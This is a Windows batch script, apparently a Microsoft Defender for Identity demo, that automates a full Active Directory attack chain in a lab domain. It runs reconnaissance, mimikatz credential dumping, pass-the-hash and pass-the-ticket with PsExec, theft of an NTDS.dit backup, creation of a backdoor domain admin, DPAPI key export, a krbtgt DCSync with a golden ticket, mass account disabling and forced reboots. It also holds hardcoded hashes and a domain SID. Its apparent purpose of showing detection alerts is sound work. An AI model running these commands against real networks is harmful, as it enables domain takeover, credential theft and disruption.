@echo off
cls
echo Testing administrator privileges
echo.

net session >NUL 2>&1
if %ERRORLEVEL% NEQ 0 (
	@echo Script is running with insufficient privileges. 
	@echo -- Please run with administrator privileges!
	color FC
	GOTO END
)

cls


echo on

@echo off
rem title MS Defender for Identity (MDI) Demo
mode con:cols=150 lines=500

echo.
echo ********************************************************************
echo *****                                                          *****
echo *****   mdi-demo.cmd   Version 1.31                            *****
echo *****                                                          ***** 
echo *****   created by hozimmer@microsoft.com                      *****
echo *****                                                          *****
echo *****   last update 2021-07-26                                 *****
echo *****                                                          *****
echo *****   used tools:                                            *****
echo *****                                                          *****
echo *****    # mimikatz.exe                                        *****
echo *****    # NetSess.exe - enumerate NetBIOS Sessions            *****
echo *****    # PsExec.exe                                          *****
echo *****    # PoSH - one (1) line script                          *****
echo *****    # remote administration tools                         *****
echo *****                                                          *****
echo ********************************************************************
rem pause

Set "UseCase=SPARK 3.0"
set "DemoTitle=Attack scenario to GO - along the kill-chain"
set "mydc=mtp-dc19"
set "myAppServer=mtp-ms19"
set "myViPC=VICTIM-PC"
set "mySAW=ADMIN-PC"
set "fqdn=threatprotection.corp"
set "UsersOU=CN=Users,DC=threatprotection,DC=corp"
set "dummyPW=79oQEOn9pYqe!"
set "logfile=C:\temp\mimikatz_trunk\x64\mdi-demo.log"
set "tickets=C:\temp\tickets"
set "globalHelpDesk=SG-Global-Helpdesk"
set "time4reboot=30"
rem set also pthntml [line 101], krbtgtntml [line 104] & domainsID [line 105]

>>%logfile% 2>&1 Echo .
>>%logfile% 2>&1 Echo ----------------------------------------------------------------------------
>>%logfile% 2>&1 Echo Starting Demo "%DemoTitle%" on %COMPUTERNAME% at %date:~10,4%%date:~4,2%%date:~7,2%.%time:~0,2%%time:~3,2%%time:~6,2%
>>%logfile% 2>&1 Echo .

title %UseCase% ### %DemoTitle%

echo.
set "victim=%date:~10,4%%date:~4,2%%date:~7,2%"
set "victim=%username:~3%"
set /p victim= "Type in your account suffix - default (%victim%):     "


echo.
echo ********************************************************************
echo *****                                                          *****
echo *****       Today I use these three (3) accounts               *****
echo *****                                                          *****
echo ********************************************************************
echo.
echo.
echo   Compromised User Account  --  VI-%victim%
echo   Helpdesk User             --  HD-%victim%
echo   Domain Admin              --  DA-%victim%
echo.
echo   Admin Maschine            --  %mySAW% 
echo   Victim Maschine           --  %myViPC%
echo.
echo.

>>%logfile% 2>&1 Echo VI-%victim% -- Compromised User Account
>>%logfile% 2>&1 Echo HD-%victim% -- Helpdesk User
>>%logfile% 2>&1 Echo DA-%victim% -- Domain Admin
>>%logfile% 2>&1 Echo .
>>%logfile% 2>&1 Echo Domain Controller -- %mydc%  [%fqdn%]
>>%logfile% 2>&1 Echo Admin Maschine    -- %mySAW%
>>%logfile% 2>&1 Echo Victim Maschine   -- %myViPC%


pause
rem mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" 
rem or use https://www.browserling.com/tools/ntlm-hash or https://codebeautify.org/ntlm-hash-generator
set "pthuser=HD-%victim%"
set "pthntml=3b63d440709ce7649f2279aa89ade67a"

rem mimikatz.exe "lsadump::dcsync /domain:<yourdomain.corp> /user:krbtgt" "exit"
set "krbtgtntml=7a1e347b0fb472276b163f0219a750eb"
set "domainsID=S-1-5-21-1414737817-687272090-350289358"

set newuser=BD-%date:~10,4%%date:~4,2%%date:~7,2%.%time:~0,2%%time:~3,2%%time:~6,2%
>>%logfile% 2>&1 Echo - Using the following back door user %newuser%

cls
rem start step_000.png
echo off
echo ********************************************************************
echo *****                                                          *****
echo *****       Attack Level - COMPROMISED User Account            *****
echo *****                                                          *****
echo *****           Was this a PRIVLEDGE(!) Account?               *****
echo *****                                                          *****
echo ********************************************************************
start step_000.png
echo.
set "PrivilegedAccount=Y" 
set /p PrivilegedAccount= "  -> Press (Y) to confirm or press (N) for a non-sensitive user! Default (%PrivilegedAccount%):     "

IF /I "%PrivilegedAccount%"=="Y" (
    color CF
	set "UserPic=step_008.png"
	set "Account=PRIVLEDGE(!) Compromised "
	set "LateralMovement=T"
	set "reconnaissance=Y"

)

IF /I "%PrivilegedAccount%"=="N" (
    color 1F
	set "UserPic=step_005.png"
	set "Account=non-sensitive Compromised"
	set "LateralMovement=H"
	set "reconnaissance=N"

)

>>%logfile% 2>&1 Echo - Start with an %Account% Account

IF /I "%PrivilegedAccount%"=="T" (
	GOTO PtT
)


IF /I "%PrivilegedAccount%"=="S" (
	GOTO SharedResources
)


start %UserPic%
NetSess.exe %mydc%
cls
echo.
echo ********************************************************************
echo *****                                                          *****
echo *****   Starting with %Account% User Account   *****
echo *****                                                          *****
echo ********************************************************************
echo off
pause
echo user VI-%victim% /domain
net user VI-%victim% /domain
pause
cls
echo.
echo ********************************************************************
echo *****   Displays a list of currently cached Kerberos tickets   *****
echo ********************************************************************
pause
echo.
klist
pause
start step_006.png
cls
echo ********************************************************************
echo *****                                                          *****
echo *****              Attack Level - RECONNAISSANCE               *****
echo *****                                                          *****    
echo *****  try to collect reconnaissance and configuration data    *****
echo *****                                                          *****
echo ********************************************************************
echo.
set "RECONNAISSANCE1=Y"
set /p RECONNAISSANCE1= "Do you want to run this step - Y or N? Default (%RECONNAISSANCE1%):     "

IF /I "%RECONNAISSANCE1%" NEQ "Y" (
	GOTO LATERALMOVEMENT
)
>>%logfile% 2>&1 Echo - Starting RECONNAISSANCE
cls
echo.
echo ********************************************************************
echo *****           TRY to enumerate Domain Admins members         *****
echo ********************************************************************
echo.
echo dsquery group -samid "Domain Admins" ! dsget group -members -expand
echo.
echo.
dsquery group -samid "Domain Admins" | dsget group -members -expand
pause
cls
echo.
echo ********************************************************************
echo *****  TRY to find Domain COMPUTER and connect to one c$ share *****
echo ********************************************************************
echo.
echo dsquery * -filter "(primaryGroupID=515)" -limit 0
echo.
echo.
dsquery * -filter "(primaryGroupID=515)" -limit 0
echo.
echo.
echo \\%mySAW%\c$
echo.
dir \\%mySAW%\c$
pause
cls
echo.
echo ********************************************************************
echo *****       TRY to find DC's and connect to one c$ share       *****
echo ********************************************************************
echo.
echo dsquery * -filter "(primaryGroupID=516)" -limit 0
echo.
echo.
dsquery * -filter "(primaryGroupID=516)" -limit 0
echo.
echo dir \\%mydc%\c$
dir \\%mydc%\c$
echo.

echo off
set /p reconnaissance= "Further reconnaissance tasks - Y or N? Default (%reconnaissance%):     "

IF /I "%reconnaissance%" NEQ "Y" (
	GOTO LATERALMOVEMENT
)


:STEP0
cls
echo.
echo ********************************************************************
echo *****  TRY to enumerate Group Policy Creator Owners members    *****
echo ********************************************************************
echo.
echo dsquery group -samid "Group Policy Creator Owners" ! dsget group -members -expand
echo.
echo.
dsquery group -samid "Group Policy Creator Owners" | dsget group -members -expand
echo.
pause
cls
echo.
echo ********************************************************************
echo *****       TRY to enumerate Enterprise Admins members         *****
echo ********************************************************************
echo.
echo dsquery group -samid "Enterprise Admins" ! dsget group -members -expand
echo.
echo.
dsquery group -samid "Enterprise Admins" | dsget group -members -expand
echo.
echo.
pause
cls
echo.
echo ********************************************************************
echo *****       open new window for Domain Zone Transfer           *****
echo ********************************************************************
echo.
echo use command: ls -d %fqdn%
echo ls -d %fqdn% | clip
echo.
echo.
start nslookup
pause
cls
echo.

echo ********************************************************************
echo *****     TRY to list NetBIOS sessions on Domain Controller    *****
echo ********************************************************************
echo.
echo NetSess.exe %mydc%
echo.
echo.
NetSess.exe %mydc%
pause

:LATERALMOVEMENT
cls
echo off
start step_007.png
echo ********************************************************************
echo *****                                                          *****
echo *****            Attack Level - LATERAL MOVEMENT               ***** 
echo *****                                                          *****
echo *****       Choose your Lateral Movement Technique!            *****
echo *****                                                          *****
echo ********************************************************************
echo.
set /p LateralMovement= "Pass-the-Hash (H), Pass-the-Ticket (T) or skip (S) this step! Default (%LateralMovement%):     "
IF /I "%LateralMovement%"=="S" (
	GOTO TryToExfiltrate
)

IF /I "%LateralMovement%"=="H" (
	GOTO PtH
)

IF /I "%LateralMovement%"=="T" (
	GOTO PtT
)


:PtH
start step_007_PtH.png
cls
echo.
echo off
echo ********************************************************************
echo *****                                                          *****
echo *****      Starting Pass-the-Hash (PtH) Attack on VictimPC     *****
echo *****                                                          *****
echo ********************************************************************
>>%logfile% 2>&1 Echo - Starting Pass-the-Hash Attack on VictimPC
pause
cls
echo.
echo ********************************************************************
echo *****         Try to find a PRIVILEDGE account                 ***** 
echo *****         e.g. member of Helpdesk Group                    ***** 
echo ********************************************************************
echo.
echo net localgroup Administrators
echo.
echo.
net localgroup Administrators
echo.
echo.
echo dsquery group -samid "%globalHelpDesk%" ! dsget group -members -expand
echo.
echo.
dsquery group -samid "%globalHelpDesk%" | dsget group -members -expand
pause
cls
echo.
echo ********************************************************************
echo *****     Try to Dump Credentials In-Memory from VictimPC      ***** 
echo ********************************************************************
echo.
echo mimikatz.exe "log .\HD-%victim%.txt" "privilege::debug" "sekurlsa::logonpasswords"  "exit"
pause 
mimikatz.exe "log .\HD-%victim%.txt" "privilege::debug" "sekurlsa::logonpasswords" "exit"
start notepad .\HD-%victim%.txt
echo HD-%victim% | clip
pause
cls
echo on
:HDHASH
cls
echo.
echo ********************************************************************
echo *****              overpass-the-Hash 'PtH' attack              ***** 
echo ********************************************************************
echo.
echo /user:%pthuser% 
echo /ntlm:%pthntml%
echo.
echo.
set "CORRECTHDHASH=Y"
set /p CORRECTHDHASH= "Is this NTLH HASH for HD-%victim%" correct - Y or N? Default (%CORRECTHDHASH%):     "

IF /I "%CORRECTHDHASH%" NEQ "Y" (
	Echo.
	echo.
	set /p pthntml= "Type in the correct NTLH HASH for HD-%victim% :     " 
    set "CORRECTHDHASH=Y"	
	Goto HDHASH
) 
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:%pthuser% /ntlm:%pthntml% /domain:%fqdn%" "exit"

echo.
echo ####################################################################
echo ######            use                                         ######
echo ######                the                                     ######
echo ######                    new                                 ######  
echo ######                        DOS                             ######
echo ######                            window                      ###### 
echo ####################################################################

pause


echo.
set /p shouldContinue= "Pass-The-Ticket Attack? Press (Y) to confirm and continue or (N) to skip: "
IF /I "%shouldContinue%"=="N" (
	GOTO TryToExfiltrate
)
IF /I "%shouldContinue%"=="Y" (
	GOTO PtT
)

:PtT
start step_007_PtT.png

title MDI Demo - PtT Attack

cls
echo.
echo ********************************************************************
echo *****                                                          *****  
echo *****         Pass-the-Ticket 'PtT' attack                     *****
echo *****                                                          *****
echo *****           - stage mimikatz on Admin PC                   *****
echo *****           - harvest Ticket on Admin PC                   *****
echo *****           - PtT to become Domain Admin                   *****
echo *****                                                          *****
echo ********************************************************************
>>%logfile% 2>&1 Echo - Starting Pass-the-Attack Attack on AdminPC
echo.
pause
cls
del c:\temp\tickets\*.kirbi
dir c:\temp\tickets\*.kirbi
rmdir \\%mySAW%\c$\temp\tickets /s /q
cls
echo.
echo ********************************************************************
echo *****      stage mimikatz on Admin PC %mySAW%                  *****  
echo ********************************************************************
echo.
md \\%mySAW%\c$\temp\tickets
echo xcopy mimikatz.exe \\%mySAW%\c$\temp\tickets
xcopy mimikatz.exe \\%mySAW%\c$\temp\tickets
pause
cls
echo.
echo ********************************************************************
echo *****      harvest tickets on Admin PC %mySAW%                 *****
echo ********************************************************************
echo.
echo PsExec.exe \\%mySAW% -accepteula cmd /c (cd c:\temp\tickets ^& mimikatz.exe "privilege::debug" "sekurlsa::tickets /export"  "exit")
echo.
echo.
PsExec.exe \\%mySAW% -accepteula cmd /c (cd c:\temp\tickets ^& mimikatz.exe "privilege::debug" "sekurlsa::tickets /export"  "exit")
pause
cls
echo.
echo ********************************************************************
echo *****       list tickets on Admin PC %mySAW%                   *****
echo ********************************************************************
echo.
echo.
dir \\%mySAW%\c$\temp\tickets\*.kirbi
pause
cls
echo.
echo ********************************************************************
echo *** copy da-%victim% tickets from Admin PC %mySAW% to Victim PC  ***
echo ********************************************************************
echo.
echo.
xcopy \\%mySAW%\c$\temp\tickets\*da-%victim%* c:\temp\tickets
pause
cls
dir c:\temp\tickets\*.kirbi
pause
rem rmdir \\%mySAW%\c$\temp\tickets /s /q
cls
echo.
echo ********************************************************************
echo     load stolen tickets from "da-%victim%" on VictimPC
echo                    to become a Domain Admin
echo ********************************************************************
echo.
pause
cls
mimikatz.exe "privilege::debug" "kerberos::ptt C:\temp\tickets" "exit"
pause
cls
echo.
echo ********************************************************************
echo *****  Displays a list of currently cached Kerberos tickets    *****
echo ********************************************************************
pause
echo.
color 4F
klist
pause
cls
echo.
echo ********************************************************************
echo *****            2nd TRY connect to DCs c$ share               *****   
echo ********************************************************************
echo.
dir \\%mydc%\c$
pause
cls
echo.
echo ********************************************************************
echo *****   2nd TRY to list NetBIOS sessions on Domain Controller  *****
echo ********************************************************************
echo.
echo NetSess.exe %mydc%
echo.
echo.
NetSess.exe %mydc%
pause


:TryToExfiltrate
cls
echo off
start step_010.png
echo ********************************************************************
echo *****                                                          *****
echo *****           Attack Level - ACCESS SENSITIVE DATA           *****
echo *****                                                          *****
echo *****          Try to find and exfiltrate these data           *****
echo *****                                                          *****
echo ********************************************************************
echo.
set "exfiltrate=Y"
set /p exfiltrate= "Do you want to run this step - Y or N? Default (%exfiltrate%)"

IF /I "%exfiltrate%" NEQ "Y" (
	GOTO DOMAINCOMPROMISED
)

net view \\%mydc%
dir \\%mydc%\ad-backup
pause
cls
echo.
echo ********************************************************************
echo *****         open cmd console on %myAppServer%
echo ********************************************************************
pause
start psexec.exe \\%myAppServer% cmd.exe
echo.
echo Try to find some sensitive data. e.g. files with passwords
echo more C:\Users\Public\Documents\my-passwords.txt | clip

pause
cls
start step_010a.png
echo.
echo ********************************************************************
echo *****             Data exfiltration over SMB Share             *****
echo ********************************************************************
pause
copy \\%mydc%\AD-Backup\*.* .
dir *.dit
pause
:DOMAINCOMPROMISED
cls
start step_011.png
echo ********************************************************************
echo *****                                                          *****
echo *****     Attack Level - DOMAIN COMPROMISED AND PERSISTENCE    *****
echo *****                                                          *****
echo *****       #1 - create back door user                         *****
echo *****       #2 - export DPAPI master key                       ***** 
echo *****       #3 - create golden ticket                          *****
echo *****       #4 - PW reset and disable users                    *****
echo *****       #5 - reboot (all machines)                         *****   
echo *****                                                          *****
echo ********************************************************************
echo.
set "RunDomainCompromised=Y"
set /p RunDomainCompromised= "Do you want to run these steps - Y or N? Default (%RunDomainCompromised%)"

IF /I "%RunDomainCompromised%" NEQ "Y" (
	GOTO CleanUP
)
cls
echo.
echo ********************************************************************
echo *****    Create Back Door User and Add to Sensitive Groups     *****
echo ********************************************************************
pause 
set newuser=BD-%date:~10,4%%date:~4,2%%date:~7,2%.%time:~0,2%%time:~3,2%%time:~6,2%
rem replace the space via 0, if you run the script before 10 or if you use am/pm
set newuser=%newuser:. =.0%
dsmod user "CN=%newuser%,%UsersOU%" -desc "MDI Demo | Backdoor User" -title "Backdoor User" -disabled no -ln "Hacker" -fn Hank -mi HH -display "Hank the Hacker (%newuser%)"
echo on
net user %newuser% %dummyPW% /ADD /DOMAIN
net group "Domain Admins" %newuser% /ADD /DOMAIN
net group "Enterprise Admins" %newuser% /ADD /DOMAIN
dsquery user -samid %newuser% | dsget user -memberof
echo off
pause
cls
echo.
echo ********************************************************************
echo *****         REMOTE CODE EXECUTION, eg.                       *****
echo *****   Add user to Amdins via psexec.exe on DC                *****
echo ********************************************************************
rem pause
rem echo on
rem PsExec.exe \\%mydc% -accepteula net localgroup "Administrators" %newuser% /add
rem PsExec.exe \\%mydc% cmd.exe /Q /c mkdir c:\temp\%newuser%
rem 1> \\mtp-dc19\ad-backup 2>&1
echo.
echo off
rem pause
cls
echo off
echo.
echo ********************************************************************
echo *****  try to export DATA PROTECTION API master key            *****
echo *****  Attackers can use the master key to decrypt any secrets *****   
echo *****     protected by DPAPI on all domain-joined machines     *****
echo ********************************************************************
echo.
echo mimikatz.exe "privilege::debug" "lsadump::backupkeys /system:%mydc%.%fqdn% /export" "exit"
echo.
echo. 
set "runexport=N"
set /p runexport= "Do you want to run this step - Y or N? Default (%runexport%)"

IF /I "%runexport%" NEQ "Y" (
	GOTO GoldenTicket
)
>>%logfile% 2>&1 Echo - Exporting DATA PROTECTION API master key
echo on
mimikatz.exe "privilege::debug" "lsadump::backupkeys /system:%mydc%.%fqdn% /export" "exit" 
dir ntds_*
echo off
pause

:GoldenTicket
set user2=FU-%date:~10,4%%date:~4,2%%date:~7,2%.%time:~0,2%%time:~3,2%%time:~6,2%
rem replace the space via 0, if you run the script before 10 or if you use am/pm
set user2=%user2:. =.0%
cls
echo off
echo.
echo ********************************************************************
echo *****  create golden ticket for unknown user                   *****
echo *****   1. dump the 'krbtgt' Hash                              *****
echo *****   2. create the ticket                                   *****
echo ********************************************************************
echo.
echo mimikatz.exe "log .\%user2%.log" "lsadump::dcsync /domain:%fqdn% /user:krbtgt"  "exit"
echo.
echo.
set "creategt=N"
set /p creategt= "Do you want to run these steps - Y or N? Default (%creategt%)"

IF /I "%creategt%" NEQ "y" (
	GOTO SharedResources
)


>>%logfile% 2>&1 Echo - Creating golden ticket for unknown user %user2%

echo off
mimikatz.exe "log .\%user2%.log" "lsadump::dcsync /domain:%fqdn% /user:krbtgt"  "exit"
start notepad .\%user2%.log
echo off
pause
cls
echo.
echo ********************************************************************
echo *****   Step 2 create the ticket                               *****
echo ********************************************************************
echo.
rem echo use nonexistent account = %user2%
echo mimikatz.exe "privilege::debug" "kerberos::purge" "kerberos::golden 
echo /domain:%fqdn% /sid:%domainsID% 
echo /rc4:%krbtgtntml% /user:%user2% 
echo /id:500 /groups:500,501,513,512,520,518,519 /ptt" "exit" 
pause
mimikatz.exe "privilege::debug" "kerberos::purge" "kerberos::golden /domain:%fqdn% /sid:%domainsID% /rc4:%krbtgtntml% /user:%user2% /id:500 /groups:500,501,513,512,520,518,519 /ptt" "exit" 

pause
cls
echo off
echo.
echo ********************************************************************
echo *****   Displays a list of currently cached Kerberos tickets   *****
echo ********************************************************************
pause
klist
pause
:SharedResources
cls
echo off
echo.
echo ********************************************************************
echo *****             Start COMPROMISING AD FOREST                 *****
echo ********************************************************************
echo.
echo.
pause
dir \\%mydc%\admin$
cls
dsmod user "CN=%newuser%,%UsersOU%" -desc "MDI Demo | Backdoor User" -disabled no -ln "Hacker" -title "Backdoor User" -fn Hank -mi HH -display "Hank the Hacker (%newuser%)"
dsquery user -name BD-*
echo.

echo pause
cls
:DISABLEUSERS
echo.
echo ********************************************************************
echo *****    Try to disable ALL user accounts (incl. PW reset)     *****
echo ********************************************************************
echo.
set "DisableUser=Y"
set /p DisableUser= "Do you want to run this step - Y or N? Default (%DisableUser%)"

IF /I "%DisableUser%" NEQ "Y" (
	GOTO Reboot
)
start dsa.msc 
msg %username% /server:%computername% "Ready to disable ALL user accounts (incl. PW reset) for domain %fqdn%? Your back door user %newuser% will be ignored :-)"
rem pause
start powershell.exe -noexit -file .\mdi-demo.ps1

pause
:Reboot
cls
echo.
echo ********************************************************************
echo *****      Try to reboot all available machines                *****
echo ********************************************************************
echo.
set "RebootAll=Y"
set /p RebootAll= "Reboot all machines in domain %fqdn% - Y or N? default (%RebootAll%)"

IF /I "%RebootAll%" NEQ "Y" (
	GOTO CleanUP
)

:SHUTDOWN
>>%logfile% 2>&1 Echo Reboot all machines
shutdown /r /f /c "Usecase %UseCase% - Your network was hacked. All machines will be rebooted in %time4reboot% seconds!!!!" /t %time4reboot% /m \\%mydc%
shutdown /r /f /c "Usecase %UseCase% - Your network was hacked. All machines will be rebooted in %time4reboot% seconds!!!!" /t %time4reboot% /m \\%computername%
shutdown /r /f /c "Usecase %UseCase% - Your network was hacked. All machines will be rebooted in %time4reboot% seconds!!!!" /t %time4reboot% /m \\%myAppServer%
shutdown /r /f /c "Usecase %UseCase% - Your network was hacked. All machines will be rebooted in %time4reboot% seconds!!!!" /t %time4reboot% /m \\%mySAW%

rem https://www.windowscentral.com/how-remote-shutdown-computer-windows-10
net use \\mtp-pc10\ipc$
shutdown /r /m \\mtp-pc10 /t %time4reboot% /c "Usecase %UseCase% - Your network was hacked. All machines will be rebooted in %time4reboot% seconds!!!!" /f

net use \\mtp-saw1\ipc$
shutdown /r /m \\mtp-saw1 /t %time4reboot% /c "Usecase %UseCase% - Your network was hacked. All machines will be rebooted in %time4reboot% seconds!!!!" /f

rem pause
:CleanUP
cls
echo off
echo.
echo ********************************************************************
echo *****                                                          *****
echo *****                      Check MDI Alerts                    *****
echo *****                                                          *****
echo ********************************************************************

rem clean update
dsmod user "CN=%newuser%,%UsersOU%" -desc "MDI Demo | Back Door User" -disabled yes 
rmdir \\%mySAW%\c$\temp\tickets /s /q

start step_012-done.png
>>%logfile% 2>&1 Echo Finished Demo "%DemoTitle%" on %COMPUTERNAME% at %date:~10,4%%date:~4,2%%date:~7,2%.%time:~0,2%%time:~3,2%%time:~6,2%
>>%logfile% 2>&1 Echo .
:END